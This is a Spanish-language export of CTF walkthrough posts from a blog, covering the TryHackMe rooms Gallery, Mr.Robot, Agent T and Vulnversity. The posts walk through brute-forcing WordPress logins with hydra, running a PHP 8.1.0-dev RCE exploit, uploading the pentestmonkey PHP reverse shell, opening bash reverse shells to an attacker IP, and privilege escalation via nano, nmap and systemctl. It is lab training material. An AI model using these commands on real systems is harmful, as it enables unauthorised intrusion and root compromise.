Mike Si vamos a /home/mike podemos ver que hay un archivo llamado user.txt el cual debe contener la flag de usuario, Pero no tenemos permisos para leerlo ni para entrar en la carpeta Documents e Images.\nDespuÃ©s de estar un rato buscando he encontrado que en /var/backups hay una carpeta llamada mike_home_backup en la cual estÃ¡n los archivos de mike y tenemos permisos para leerlos.\nDentro de Documents hay un archivo con 3 contraseÃ±as de otras webs con el usuario mike, he probado si alguna de estas sirve para esta mÃ¡quina pero no.\nEn Images, hay 3 fotos las cuales he mirado si tenÃ­an algÃºn archivo oculto pero no\nCon un ls -a podemos ver que hay un historial .bash_historycon un cat podemos ver su contenido, dentro hay un comando en el que parece especificar una contraseÃ±a: sudo -lb3stpassw0rdbr0xx con el comando su mike y proporcionando la contraseÃ±a b3stpassw0rdbr0xx ya somos mike\nYa podemos ver la flag\nRoot Con sudo -l Podemos ver que puede ejecutar lo siguiente como root sin contraseÃ±a /bin/bash /opt/rootkit.sh\nAl ejecutar sudo /bin/bash /opt/rootkit.sh y le damos a read nos abre un archivo con un texto muy largo. Como estamos ejecutando nano como root podemos probar con ctrl + r, ctrl + x y escribiendo reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0, ya somos root\n","date":"2022-12-21","id":112,"permalink":"/writeups/tryhackme/gallery/","summary":"https://tryhackme.com/room/gallery666\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.250.47\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","sqli","file upload"],"title":"Gallery"},{"content":"","date":"2022-12-20","id":113,"permalink":"/tags/fuerza-bruta/","summary":"","tags":[],"title":"Fuerza bruta"},{"content":"","date":"2022-12-20","id":114,"permalink":"/tags/hash-raw-md5/","summary":"","tags":[],"title":"hash raw-md5"},{"content":"https://tryhackme.com/room/mrrobot\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.193.138\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.193.138 PING 10.10.193.138 (10.10.193.138) 56(84) bytes of data. 64 bytes from 10.10.193.138: icmp_seq=1 ttl=63 time=56.6 ms --- 10.10.193.138 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 56.631/56.631/56.631/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nâ¯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.193.138 -oG allPort ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.46.125 5 â”‚ [*] Open ports: 80,443 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p80,443 -sV -sC 10.10.193.138 -oN target PORT STATE SERVICE VERSION 80/tcp open http Apache httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Web Con el whatweb podemos ver mas informaciÃ³n sobre la web\nâ¯ whatweb 10.10.193.138 http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.193.138], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN] Al entrar a la web vemos una animaciÃ³n que simula el arranque de un Linux, quando termina muestra el siguiente mensaje\nMas abajo vemos una \u0026ldquo;terminal\u0026rdquo; en la cual solo se pueden usar los comandos que salen arriba\nTodos los comandos muestran videos, fotos y mensajes relacionados con la serie\u0026hellip;\nBuscando subdirectorios Para ver si hay subdirectorios vamos a usar la herramienta gpbuster para fusear mediante un diccionario que estÃ¡ en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nâ¯ gobuster dir -u http://10.10.46.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== 2022/12/19 21:57:53 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 236] [--\u0026gt; http://10.10.193.138/images/] /blog (Status: 301) [Size: 234] [--\u0026gt; http://10.10.193.138/blog/] /rss (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /sitemap (Status: 200) [Size: 0] /login (Status: 302) [Size: 0] [--\u0026gt; http://10.10.193.138/wp-login.php] /0 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/0/] /feed (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /video (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/video/] /image (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/image/] /atom (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/atom/] /wp-content (Status: 301) [Size: 240] [--\u0026gt; http://10.10.193.138/wp-content/] /admin (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/admin/] /audio (Status: 301) [Size: 235] [--\u0026gt; http://10.10.193.138/audio/] /intro (Status: 200) [Size: 516314] /wp-login (Status: 200) [Size: 2613] /css (Status: 301) [Size: 233] [--\u0026gt; http://10.10.193.138/css/] /rss2 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/] /license (Status: 200) [Size: 309] /wp-includes (Status: 301) [Size: 241] [--\u0026gt; http://10.10.193.138/wp-includes/] /js (Status: 301) [Size: 232] [--\u0026gt; http://10.10.193.138/js/] /Image (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/Image/] /rdf (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/feed/rdf/] /page1 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.193.138/] /readme (Status: 200) [Size: 64] /robots (Status: 200) [Size: 41] /dashboard (Status: 302) [Size: 0] [--\u0026gt; http://10.10.193.138/wp-admin/] Nos reporta muchos subdirectorios, despues de ir probando uno por uno, e visto 2 que son importantes\n/robots/ Contenido del /robots/\nUser-agent: * fsocity.dic key-1-of-3.txt Ya tenemos la primera key\nâ¯ curl http://10.10.193.138/key-1-of-3.txt ---------- key 1 ---------- En el robots tambiÃ©n indica otro archivo fsocity.dic, con wget nos lo podemos passar a nuestra mÃ¡quina\nâ¯ wget http://10.10.193.138/fsocity.dic Es un dicionario con 858160 palabras\n/wp-admin/ En wp-admin hay un panel de login de WordPress, probamos con las tÃ­picas credenciales admin:admin, no funcionan pero hay un pequeÃ±o detalle importante\nEn vez de decir que las credenciales sÃ³n incorrectas, especifica que es lo que esta mal, aprovechando esto podemos usar un diccionario de usuarios hasta que no de ese error y despues con las contraseÃ±as\nIntrusion Con hydra vamos a probar con los usuarios de el dicionario que nos descargamos de /fsocity.dic/ con la contraseÃ±a test\nâ¯ hydra -L fsocity.dic -p test 10.10.193.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:Invalid username\u0026#34; -t 30 [80][http-post-form] host: 10.10.193.138 login: Elliot password: test Ya tenemos un usuario (Elliot), ahora con hydra tambiÃ©n vamos a probar contraseÃ±as con el dicionario rockyou.txt\nâ¯ hydra -l Elliot -P fsocity.dic 10.10.33.39 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:The password you entered for the username Elliot is incorrect\u0026#34; -t 30 [80][http-post-form] host: 10.10.193.138 login: Elliot password: ER28-0652 Con estas credenciales ya podemos iniciar session en la web, eso nos lleva al panel de administraciÃ³n de la web\nAhora el objetivo seria encontrar algÃºn sitio en el que poder subir archivos, para mandar un php malicioso que nos enviÃ© una reverse shell\nEn el apartado de posts podemos subir o escribir archivos pero se quedan en texto plano\nEn el media podemos subir archivos.\nPero despuÃ©s de comprobarlo con el burpsuite como en la maquina Vulnversity solo acepta archivos con extensiones de fotos.\nDentro del apartado de apariencia, en el editor podemos ver que salen los archivos php de la web, los cuales podemos editar.\nPor ejemplo vamos a abrir el 404.php y vamos a sustituir lo que habÃ­a por el cÃ³digo de la reverse shell, es importante cambiar el puerto por el que nos ponemos en escucha y la ip de nuestra maquina\nAhora nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Ahora al poner un subdirectorio random http://10.10.193.138/okjihogyklasd ejecuta el 404.php y recibimos la conexiÃ³n.\nEscalada de privilegios En el directorio /home/robot esta la segunda flag, tambiÃ©n hay un archivo con un hash raw-md5\nâ¯ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3]) censored password (?) Ahora al intentar convertirnos en robot sale este error\n$ su robot su: must be run from a terminal Con python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' se soluciona el problema\ndaemon@linux:/$ python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; daemon@linux:/$ su robot su robot Password: abcdefghijklmnopqrstuvwxyz robot@linux:/$ Ahora con find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null, ay un que no deveria de estar ahi, nmap\nnmap --interactive Eso abre el nmap en modo interactive, como se esta ejecutando como root, si hacemos !sh para spawnear una sh, ya somos root, podemos ver la ultima flag en /root\n","date":"2022-12-20","id":115,"permalink":"/writeups/tryhackme/mr.robot/","summary":"https://tryhackme.com/room/mrrobot\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.193.138\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","Mediana","Linux","Fuerza bruta","hash raw-md5","php","nmap"],"title":"Mr.Robot"},{"content":"","date":"2022-12-20","id":116,"permalink":"/tags/nmap/","summary":"","tags":[],"title":"nmap"},{"content":"","date":"2022-12-20","id":117,"permalink":"/tags/php/","summary":"","tags":[],"title":"php"},{"content":"https://tryhackme.com/room/agentt\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.175.238\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.175.238 PING 10.10.175.238 (10.10.175.238) 56(84) bytes of data. 64 bytes from 10.10.175.238: icmp_seq=1 ttl=63 time=47.7 ms --- 10.10.175.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 47.680/47.680/47.680/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nâ¯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.175.238 -oG allPort ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.175.238 5 â”‚ [*] Open ports: 80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p80 -sC -sV 10.10.175.238 -oN target PORT STATE SERVICE VERSION 80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev) |_http-title: Admin Dashboard InfiltraciÃ³n Con searchsploit podemos comprobar si la version de php es vulnerable\nâ¯ searchsploit PHP 8.1.0-dev -------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------- --------------------------------- PHP 8.1.0-dev - \u0026#39;User-Agentt\u0026#39; Remote Code Execution | php/webapps/49933.py -------------------------------------------------------- --------------------------------- Hay un exploit de remote code execution, con searchsploit -m 49933 nos lo podemos pasar a nuestra mÃ¡quina.\nâ¯ python3 49933.py Enter the full host url: http://10.10.175.238 Interactive shell is opened on http://10.10.175.238 Can\u0026#39;t acces tty; job crontol turned off. $ whoami root Ya tenemos una shell interactiva como root, pero no podemos salir del directorio /var/www/html, vamos a intentar crear una reverse shell.\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Intentamos mandarnos la reverse shell con bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1, pero no recibimos nada, probamos con bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot; ahora si, ya podemos ver la flag que estÃ¡ en /flag.txt\n","date":"2022-12-19","id":118,"permalink":"/writeups/tryhackme/agent-t/","summary":"https://tryhackme.com/room/agentt\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.175.238\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","php"],"title":"Agent T"},{"content":"Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.\nhttps://tryhackme.com/room/vulnversity\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.23.174\nReconocimiento Para la fase de Reconocimiento vamos a usar nmap.\nÂ¿QuÃ© es nmap?\nnmap es una herramienta potente, gratuita y de cÃ³digo abierto que se utiliza para descubrir hosts y servicios en una red informÃ¡tica. En nuestro ejemplo, usamos nmap para escanear esta mÃ¡quina e identificar todos los servicios que se ejecutan en un puerto en particular. nmap tiene muchas capacidades, a continuaciÃ³n hay una tabla que resume algunas de las funciones que proporciona.\nParÃ¡metros tÃ­picos nmap:\nParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) -p\u0026rsquo;port' Escanear unos puertos en especÃ­fico \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG archivo Para que guarde el escaneo en format grepeable en un archivo llamado archivo -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Escanea la mÃ¡quina, Â¿cuÃ¡ntos puertos estÃ¡n abiertos? â¯ nmap -p- 10.10.23.174 PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3128/tcp open squid-http 3333/tcp open dec-notes Tiene un total de 6 puertos abiertos\nÂ¿QuÃ© versiÃ³n del proxy se estÃ¡ ejecutando en la mÃ¡quina? â¯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel En el puerto 3128 se puede ver la version de la proxy 3.5.12\nÂ¿CuÃ¡ntos puertos escanearÃ¡ nmap si se usÃ³ la bandera -p-400? Como se indica en el parÃ¡metro (-p-400), Escaneara 400 puertos\nUsando el indicador nmap -n, Â¿quÃ© no resolverÃ¡? Con Ã©l -n no hacer DNS\nÂ¿CuÃ¡l es el sistema operativo mÃ¡s probable que estÃ© ejecutando esta mÃ¡quina? â¯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel En el puerto 3333 indica que es un Ubuntu\nÂ¿En quÃ© puerto se estÃ¡ ejecutando el servidor web? â¯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel El servidor web se estÃ¡ ejecutando por el puerto 3333\nLocalizando subdirectorios Para esta parte vamos a buscar directorios con gobuster y wfuzz usando el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nÂ¿CuÃ¡l es el directorio que tiene una pÃ¡gina de formulario de carga? GoBuster GoBuster es una herramienta utilizada para la fuerza bruta de URI (directorios y archivos), subdominios DNS y nombres de host virtual. Para esta mÃ¡quina, nos centraremos en usarla para directorios de fuerza bruta.\nParÃ¡metro FunciÃ³n -e Imprima las URL completas en su consola -u La URL de destino -w Ruta a tu diccionario -U y -P Nombre de usuario y contraseÃ±a para autenticaciÃ³n bÃ¡sica -p\u0026rsquo;x' Proxy a utilizar para las solicitudes -c \u0026lsquo;http cookies\u0026rsquo; Especifique una cookie para simular su autenticaciÃ³n â¯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== 2022/12/18 01:37:49 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 320] [--\u0026gt; http://10.10.23.174:3333/images/] /css (Status: 301) [Size: 317] [--\u0026gt; http://10.10.23.174:3333/css/] /js (Status: 301) [Size: 316] [--\u0026gt; http://10.10.23.174:3333/js/] /fonts (Status: 301) [Size: 319] [--\u0026gt; http://10.10.23.174:3333/fonts/] /internal (Status: 301) [Size: 322] [--\u0026gt; http://10.10.23.174:3333/internal/] Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: internal\nwfuzz Wfuzz fue creado para facilitar la tarea en las evaluaciones contra aplicaciones web, y estÃ¡ basado en un concepto simple; reemplaza cualquier referencia a la palabra clave FUZZ, por el valor del payload (carga Ãºtil) definido.\nUn payload en Wfuzz es una fuente de datos.\nEste concepto simple permite cualquier entrada sea inyectada en cualquier campo de una peticiÃ³n HTTP, permitiendo realizar ataques complejos de seguridad web en diferentes componentes de la aplicaciÃ³n web, como parÃ¡metros, formularios, directorios/archivos, cabeceras, etc.\nFuente\nParÃ¡metro FunciÃ³n -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario â¯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000550: 301 9 L 28 W 317 Ch \u0026#34;css\u0026#34; 000000953: 301 9 L 28 W 316 Ch \u0026#34;js\u0026#34; 000002771: 301 9 L 28 W 319 Ch \u0026#34;fonts\u0026#34; 000002984: 301 9 L 28 W 322 Ch \u0026#34;internal\u0026#34; 000095524: 403 11 L 32 W 302 Ch \u0026#34;server-status\u0026#34; Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: internal\nComprometer el servidor web Â¿QuÃ© tipo de archivo comÃºn, que le gustarÃ­a cargar para explotar el servidor, estÃ¡ bloqueado? Prueba un par para averiguarlo. La respuesta es .php\nÂ¿QuÃ© extensiÃ³n estÃ¡ permitida? Para identificar quÃ© extensiones no estÃ¡n bloqueadas, vamos a fuzzear el formulario de carga. Para hacer esto, vamos a usar BurpSuite.\nPrimero vamos a capturar la peticiÃ³n, enviarlo al intruder y definir la extensiÃ³n como una variable\nEn el apartado de payloads vamos a definir las extensiones que queremos que pruebe\nAhora ya le podemos dar a attack.\nSi nos fijamos en la columna de length podemos ver que en todas sale lo mismo menos una. Eso significa que con Ã©l .phtml no nos ha devuelto el mismo mensaje, se puede suponer que lo ha aceptado\nÂ¿CuÃ¡l es el nombre del usuario que administra el servidor web? Viendo que podemos subir .phtml vamos a mandarle un archivo para crear una reverse shell, vamos a usar https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php de pentestmonkey\n# Nos lo pasamos a nuestra mÃ¡quina wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php # Le cambiamos la extensiÃ³n mv php-reverse-shell.php php-reverse-shell.phtml Importante cambiar estas lÃ­neas\n$ip = \u0026#39;127.0.0.1\u0026#39;; // Ip de tÃº mÃ¡quina $port = 1234; // Puerto en el que te vas a poner en escucha Nos ponemos en escucha por el puerto 443 con netcat\nnc -nlvp 443 Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador\nhttp://10.10.23.174:3333/internal/uploads/php-reverse-shell.phtml\nAntes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill\nEscalada de privilegios En Linux, SUID (establecer el ID de usuario del propietario en la ejecuciÃ³n) es un tipo especial de permiso de archivo otorgado a un archivo. SUID otorga permisos temporales a un usuario para ejecutar el programa/archivo con el permiso del propietario del archivo (en lugar del usuario que lo ejecuta).\nPor ejemplo, el archivo binario para cambiar su contraseÃ±a tiene el bit SUID (/usr/bin/passwd). Esto se debe a que para cambiar su contraseÃ±a, deberÃ¡ escribir en el archivo shadowers al que no tiene acceso, root sÃ­, por lo que tiene privilegios de root para realizar los cambios correctos.\nEn el sistema, busque todos los archivos SUID. Â¿QuÃ© archivo se destaca? Con find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null podemos ver los archivos con permisos suid. La respuesta es /bin/systemctl\nConviÃ©rtase en root y obtenga la Ãºltima flag (/root/root.txt) Ejecutando lo siguiente y despuÃ©s haciendo un cat a /tmp/output podemos ver la flag\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;cat /root/root.txt \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF cat /tmp/output ","date":"2022-12-18","id":119,"permalink":"/writeups/tryhackme/vulnversity/","summary":"Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.\nhttps://tryhackme.com/room/vulnversity\nIP Atacante = 10.10.10.10","tags":["Walkthroughs","FÃ¡cil","Linux"],"title":"Vulnversity"},{"content":"","date":"2022-12-18","id":120,"permalink":"/tags/walkthroughs/","summary":"","tags":[],"title":"Walkthroughs"},{"content":"https://tryhackme.com/room/brooklynninenine\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.243.15\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.243.15 PING 10.10.243.15 (10.10.243.15) 56(84) bytes of data. 64 bytes from 10.10.243.15: icmp_seq=1 ttl=63 time=96.3 ms --- 10.10.243.15 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 96.338/96.338/96.338/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nâ¯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.243.15 -oG allPort ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts 